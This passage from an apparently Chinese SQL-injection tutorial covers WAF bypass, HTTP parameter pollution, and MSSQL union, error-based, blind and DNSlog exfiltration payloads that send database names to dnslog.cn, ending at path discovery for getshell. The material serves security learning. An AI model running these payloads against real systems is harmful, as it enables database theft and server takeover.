<p><code>a</code>：无实际意义的占位符，用于绕过简单关键词过滤（如检测<code>1=</code>）</p>
</blockquote>
<p>若 <code>&#123;&#125;</code> 或 <code>a</code> 无法被解析，可能被静默忽略。</p>
<p>实际等价于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AND 1=1   -- 恒真</span><br><span class="line">AND 1=2   -- 恒假</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(database()=&#x27;Security&#x27;, &#123;a 1=1&#125;, &#123;a 1=2&#125;) --+ </span><br></pre></td></tr></table></figure>

<h3 id="HTTP参数污染绕过"><a href="#HTTP参数污染绕过" class="headerlink" title="HTTP参数污染绕过"></a>HTTP参数污染绕过</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p>
<p>其原理就是当浏览器在跟服务器进行交互过程中，浏览器往往会在GET&#x2F;POST请求里带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。</p>
<p>但是在HTTP协议中允许同样名称的参数多次出现，如：<code>http://www.baidu.com/?name=aa&amp;name=bb</code>。而针对这种情况，不同的服务器处理的方式会不一样，有的服务器是取第一个参数，即<code>name=aa</code>，有的服务器是取第二个参数<code>name=bb</code>，有的服务器两个参数都取，即<code>name=aa,bb</code>，而这种waf绕过一些服务器端的逻辑判断时非常有用。</p>
<p><strong>HPP参数污染</strong>可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com/index.asp?page=select 1,2,3 from table where id=1</span><br><span class="line"></span><br><span class="line">http://www.baidu.com/index.asp?page=select 1&amp;page=2,3 from table where id=1</span><br></pre></td></tr></table></figure>

<p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/1628845374145-fcc0997e-96c2-4bcf-9644-57db93d3a475.png"></p>
<p>HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果</p>
<p>以参数color&#x3D;red&amp;color&#x3D;blue为例:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/1628844984291-02f867a8-634a-40bd-a5f5-5f9d95097a5a.png"></p>
<h2 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h2><h3 id="sql-server-mssql-注入"><a href="#sql-server-mssql-注入" class="headerlink" title="sql server(mssql)注入"></a>sql server(mssql)注入</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><code>mssql</code>是指微软的<code>sql server</code>数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属于<strong>关系型数据库</strong>，端口号为<strong>1433</strong>。</p>
<p>数据库后缀名<code>.mdf</code>，注释符为<code>--</code></p>
<p><code>sql server</code>数据库有六个默认的库，分别为4个系统数据库：<strong>master 、model 、msdb 、tempdb</strong>，和2个实例数据库：ReportServer、ReportServerTempDB。</p>
<ul>
<li><p><strong>master</strong></p>
<p>用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。</p>
<p>这个库也是mssql注入中最终重要的，其中<strong>储存了所有数据库名与存储过程</strong>。类比于mysql中的<code>information_schema</code></p>
</li>
<li><p><strong>model</strong></p>
<p>sql server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</p>
</li>
<li><p><strong>msdb</strong></p>
<p>由Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息</p>
</li>
<li><p><strong>tempdb</strong></p>
<p>它为临时表和其他临时工作提供了一个存储区</p>
</li>
</ul>
<p>以 master 库为例，其中视图表 <code>master.dbo.sysdatabases</code> 储存所有数据库名，其他数据库的视图则储存它本库的表名与列名。每一个库的视图表都有 <code>syscolumns</code> 存储着所有的字段，可编程性储存着我们的函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from master.dbo.sysdatabases;</span><br></pre></td></tr></table></figure>

<p>查询所有数据库的名称。</p>
<h4 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h4><p>sql server内部按作用范围分有三大主体：</p>
<ul>
<li><strong>Windows级别主体</strong></li>
<li><strong>服务器级别主体</strong></li>
<li><strong>数据库级别主体</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250419-210416.png"></p>
<p>对于<strong>服务器级别</strong>：</p>
<p>在微软官方文档中可看到，<code>IS_SRVROLEMEMBER ( &#39;role&#39; [ , &#39;login&#39; ] )</code>函数role的有效值是<strong>用户定义的服务器角色</strong>和以下<strong>固定服务器角色</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/20210120145938.png"></p>
<table>
<thead>
<tr>
<th>返回值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>login 不是 role 的成员。</td>
</tr>
<tr>
<td>1</td>
<td>login 是 role 的成员。</td>
</tr>
<tr>
<td>NULL</td>
<td>role 或 login 无效，或者没有查看角色成员身份的权限。</td>
</tr>
</tbody></table>
<p>构造语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;serveradmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;setupadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;securityadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;diskadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;bulkadmin&#x27;))</span><br></pre></td></tr></table></figure>

<p><strong>sqlmap中可用<code>-is-dba</code>判断是否为管理员权限</strong></p>
<p>对于<strong>数据库级别</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select IS_MEMBER(&#x27;db_owner&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/20210120150401.png"></p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><strong>注释符</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">-- </span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>

<p><strong>空白字符</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br><span class="line"></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>

<p>语法定义符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL 语言的非终结符。</span><br><span class="line"></span><br><span class="line">::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。</span><br><span class="line"></span><br><span class="line">[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。</span><br><span class="line"></span><br><span class="line">&#123; &#125; 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。</span><br><span class="line"></span><br><span class="line">() 括号是分组运算符</span><br></pre></td></tr></table></figure>

<h4 id="注入常用参数-1"><a href="#注入常用参数-1" class="headerlink" title="注入常用参数"></a>注入常用参数</h4><h5 id="相关函数和表"><a href="#相关函数和表" class="headerlink" title="相关函数和表"></a>相关函数和表</h5><p>常用函数：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>db_name()</td>
<td>返回当前数据库的名称</td>
</tr>
<tr>
<td>host_name()</td>
<td>返回计算机名称</td>
</tr>
<tr>
<td>current_user</td>
<td>返回当前数据库的用户名</td>
</tr>
<tr>
<td>substring()</td>
<td>字符串截取函数</td>
</tr>
<tr>
<td>@@version</td>
<td>查看数据库版本</td>
</tr>
<tr>
<td>char()</td>
<td>ASCII 转字符函数</td>
</tr>
<tr>
<td>cast(text as type)</td>
<td>字符类型转换，如果转换失败会将 text 结果报错显示在页面上</td>
</tr>
<tr>
<td>object_id()</td>
<td>根据表名返回数据库表名 ID</td>
</tr>
<tr>
<td>object_name()</td>
<td>根据 ID 返回数据库表名</td>
</tr>
<tr>
<td>col_name(object_id,column_id)</td>
<td>返回指定表中指定字段(列）的名称</td>
</tr>
<tr>
<td>dbid</td>
<td>数据库的唯一标识符，如dbid1&#x3D;master</td>
</tr>
<tr>
<td>SUSER_NAME()</td>
<td>获取当前登录的SQL Server账户</td>
</tr>
<tr>
<td>USER_NAME()</td>
<td>获取当前数据库用户</td>
</tr>
<tr>
<td>FILE_NAME()</td>
<td>获取逻辑文件名</td>
</tr>
<tr>
<td>TYPE_NAME()</td>
<td>获取数据类型名称</td>
</tr>
</tbody></table>
<p><strong>内置系统表:</strong></p>
<ul>
<li><p><strong>Sysdatabases 表</strong></p>
<p>Sysdatabases 表只保存在 master 数据库中，这个表中保存的是所有的库名，主要字段有：name 数据库名</p>
</li>
<li><p><strong>Sysobjects表</strong></p>
<p>SQLServer 中的每个数据库内都有此系统表，存放着数据库所有的表名。</p>
<p>而在该系统表中对我们有用的有三个字段：<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段</p>
<ul>
<li><strong>name就是表名信息</strong></li>
<li><strong>xtype是代表表的类型，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表</strong></li>
<li><strong>id字段的值用来连接syscolumns表(查列时会用到)</strong></li>
</ul>
</li>
<li><p><strong>Syscolumns 表</strong></p>
<p>Syscolumns 表位于每个数据库中，存放着数据库所有的字段名。主要字段有：name、id 分别是字段名称、表 ID，其中的 ID 是用 sysobjects 得到的表的 ID 号。</p>
</li>
</ul>
<h5 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h5><ul>
<li><p><strong>查看数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select @@servername;    #查询服务名</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select db_name(1);      #查询第一个数据库名</span><br><span class="line">select db_name(2);      #查询第二个数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">;select user #查询是否支持多语句</span><br><span class="line">1&#x27; and host_name()=@@servername;-- #判断站库分离</span><br><span class="line">use tempdb              #切换到tempdb表  </span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">EXEC sp_spaceused @updateusage = N&#x27;TRUE&#x27;;  #查询当前数据库的大小</span><br><span class="line">sp_spaceused &#x27;表名&#x27;                #查询指定表名的大小</span><br><span class="line">EXEC master.sys.xp_dirtree &#x27;\\192.168.106.5\xx.txt&#x27;,0,1;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>判断是否是SA权限</strong></p>
<p>对于<code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-isers)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)     </span><br><span class="line">判断是否是db_owner权限  </span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line">判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>数据库连接</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server=服务器地址,端口; Database=数据库名; User Id=用户名; Password=密码;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查询数据库</strong></p>
<p><code>master.dbo.sysdatabases</code> 储存所有数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from sysdatabases     #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查询数据表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from sysobjects where xtype=&#x27;U&#x27; #查询当前数据库中表的个数</span><br><span class="line">select name from sysobjects where xtype=&#x27;U&#x27;  #查询当前数据库中所有表的名字</span><br><span class="line">select * from sysobjects where xtype=&#x27;U&#x27;    #查询当前数据库的所有表的详细信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from test..sysobjects where xtype=&#x27;U&#x27;  #查询指定test数据库中表的个数</span><br><span class="line">select name from test..sysobjects where xtype=&#x27;U&#x27;         #查询指定test数据库中表的名字</span><br><span class="line">select * from test..sysobjects where xtype=&#x27;U&#x27;            #查询指定test数据库中表的详细信息</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>..</code>表示默认架构dbo</p>
</blockquote>
</li>
<li><p><strong>查询列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)     #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列的名字</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一般每个表名在 <code>sysobjects</code> 中唯一，<code>name=&#39;users&#39;</code> 应仅返回一条记录。使用 <code>MAX(id)</code> 是一种防御性写法，防止意外情况下多条记录导致错误。</p>
</blockquote>
</li>
<li><p><strong>查询数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from test..users          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..users                 #查询test数据库user表的所有数据</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="注入姿势-1"><a href="#注入姿势-1" class="headerlink" title="注入姿势"></a>注入姿势</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>mssql联合注入一般不使用数字占位，而是null，因为使用数字占位可能会发生隐式转换</p>
<p>流程：</p>
<ul>
<li><p><strong>判断注入点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1--</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>判断字段数</strong></p>
<p>一样利用order by判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 5--</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select db_name()), null, null --</span><br></pre></td></tr></table></figure>

<blockquote>
<p>union all保留所有行，union会删除重复项</p>
</blockquote>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 name from 库名.dbo.sysobjects where xtype=&#x27;u&#x27;), null,null --</span><br></pre></td></tr></table></figure>

<blockquote>
<p>top 1查询前1条数据</p>
</blockquote>
</li>
<li><p><strong>爆字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects), null,null</span><br></pre></td></tr></table></figure>

<blockquote>
<p>object_id()：根据表名返回数据库表名id</p>
<p>col_name(object_id,column_id)：返回指定表中指定字段(列）的名称</p>
</blockquote>
</li>
<li><p><strong>获取数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 username from manage),null,null</span><br><span class="line"></span><br><span class="line">union all select 1,(select top 1 password from manage),null,null</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h5><p>有两种方法：</p>
<ul>
<li><p><strong>通过将非数值类型强制转换为数值类型，触发隐式转换报错</strong></p>
<p>如<code>CAST(USER as int)</code>、<code>convert(int,db_name())</code>、<code>db_name()&gt;0</code>、<code>id=1 and 1=(select top 1 table_name from information_schema.tables);--</code>等等</p>
</li>
<li><p><strong>通过聚合函数与 GROUP BY 冲突</strong></p>
<p>如<code>id=1 group by info.id,info.name having 1=1</code></p>
</li>
</ul>
<p>利用函数：</p>
<ul>
<li><p><strong>cast()<strong>：将表达式转换为指定数据类型，</strong>ANSI标准函数</strong>，但无格式化参数。</p>
<p><code>CAST(USER as int)</code>将user当作int类型处理，触发隐式转换错误</p>
</li>
<li><p>**convert()**：用于把⽇期转换为新数据类型的通⽤函数。</p>
<p><code>convert(int,db_name())</code>，含义是将第二个参数的值转换成第一个参数的int类型。利用MSSQL在转换类型的时候就出错，来爆数据库等信息。</p>
</li>
<li><p><strong>quotename()<strong>：默认在要处理的参数左右加上两个中括号，起到</strong>分隔符</strong>的作用，避免出现<strong>sql关键字异常</strong></p>
<p><code>quotename(name)</code>，给查询出的多个表名、列名加入中括号，或者其他符号为分隔符，进行分割，可使SQL注入结果更清晰。</p>
</li>
<li><p>**for xml path(‘’)**：提供查询返回的结果为xml格式，此时返回的相当于一个字符串</p>
<p>将查询到的数据，通过xml进行显示，path指定xml元素结点（行节点），该语句可以将查询到的所有数据<strong>通过XML进行显示</strong></p>
</li>
<li><p><strong>stuff()<strong>：stuff()函数将表中列的内容</strong>横向输出</strong></p>
<p>stuff(param1, startIndex, length, param2)，将param1中自startIndex(SQL中都是从1开始，而非0)起，删除length个字符，然后用param2替换删掉的字符。</p>
</li>
</ul>
<p>流程：</p>
<ul>
<li><p><strong>爆库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;and db_name()&gt;0;--</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>多个数据库情况下</p>
</blockquote>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;);--</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;admin&#x27;) and name&lt;&gt;&#x27;id&#x27;);--</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 username from admin);--</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>与mysql原理类似</p>
<p><strong>布尔盲注</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;= 109 #爆库名</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and len(name)=5)=1   #爆表长度</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,1,1))=117)=1  #爆表名</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,1,1))=105)=1  #爆第二个表名</span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1;if (select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))=1 WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line"></span><br><span class="line">id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br></pre></td></tr></table></figure>

<blockquote>
<p>前提是能用堆叠，利用<code>waitfor delay &#39;*&#39;</code>延时，’0.0.5’表示小时、分钟、秒</p>
</blockquote>
<p><strong>dnslog外带注入</strong>:</p>
<p>前提是<strong>能堆叠，且权限为sa</strong></p>
<p>原理是用xp_subdirs，xp_dirtree, xp_fileexist三个扩展存储过程，读取smb共享域名。也有用OpenRowset()和OpenDatasource()的办法，这两个函数为远程加载其他mssql数据库，默认关闭。</p>
<p>xp_subdirs：<strong>用于列出指定目录的子目录</strong>。</p>
<p>xp_dirtree：<strong>递归列出指定目录的所有子目录和文件</strong>。</p>
<p>xp_fileexist：<strong>检查指定文件或目录是否存在</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @host varchar(1024);</span><br><span class="line">select @host=convert(varchar(1024),db_name())+&#x27;.vj0r9q.dnslog.cn&#x27;;</span><br><span class="line">exec(&#x27;master..xp_subdirs &quot;\\&#x27;+@host+&#x27;&quot;&#x27;); --xp_subdirs 尝试访问 \\db_name().vj0r9q.dnslog.cn，这会触发一次 DNS 解析请求。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>declare声明变量</p>
</blockquote>
<p>或者：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;master..xp_dirtree &quot;\\&#x27;+@host+&#x27;&quot;&#x27;);</span><br><span class="line">exec(&#x27;master..xp_fileexist &quot;\\&#x27;+@host+&#x27;\test&quot;&#x27;);</span><br></pre></td></tr></table></figure>

<p>也有无需堆叠的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from fn_xe_file_target_read_file(&#x27;C:\Windows\win.ini&#x27;,&#x27;\\&#x27;+(select user)+&#x27;.a72ita.dnslog.cn\1.xem&#x27;,null,null))</span><br><span class="line">and exists(select * from fn_get_audit_file(&#x27;\\&#x27;+(select user)+&#x27;.a72ita.dnslog.cn\1.xem&#x27;,null,null))</span><br><span class="line">and exists(select * from fn_trace_gettable(&#x27;\\&#x27;+(select user)+&#x27;.xrjff0.dnslog.cn\1.trc&#x27;,null))</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>fn_xe_file_target_read_file</code>:用于读取 SQL Server 扩展事件（Extended Events）的目标文件。第二个参数本应是扩展事件文件路径，这里换成我们的查询语句通过UNC 路径会触发DNS请求</p>
<p><code>fn_get_audit_file</code>：用于读取SQL Server 审计日志文件。</p>
<p><code>fn_trace_gettable</code>：用于读取 SQL Server 跟踪文件</p>
</blockquote>
<h4 id="mssql-getshell"><a href="#mssql-getshell" class="headerlink" title="mssql getshell"></a>mssql getshell</h4><p>注意，除了备份写shell其他都要sa权限</p>
<h5 id="获取网站绝对路径"><a href="#获取网站绝对路径" class="headerlink" title="获取网站绝对路径"></a>获取网站绝对路径</h5><ul>
<li><p><strong>报错寻找</strong></p>
</li>
<li><p><strong>通过配置文件</strong></p>
</li>
<li><p><strong>字典爆破</strong></p>
</li>
<li><p><strong>cmd搜索文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for %i in (c d e f g h i j k l m n o p q r s t u v w x v z) do @(dir/s/b %i:\sql.aspx)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>/s</code>:列出所有子目录下的文件和文件夹</p>
<p><code>/b</code>:只列出路径和文件名，别的属性全部不显示</p>
</blockquote>
</li>
<li><p><strong>旁站信息收集</strong></p>
<p>找旁站有没有泄露绝对路径</p>
</li>
<li><p><strong>存储过程来搜索</strong></p>
<p><code>xp_cmdshell</code>：直接执行系统命令。</p>
<p><code>xp_dirtree</code>：递归列出指定目录的所有子目录和文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure>

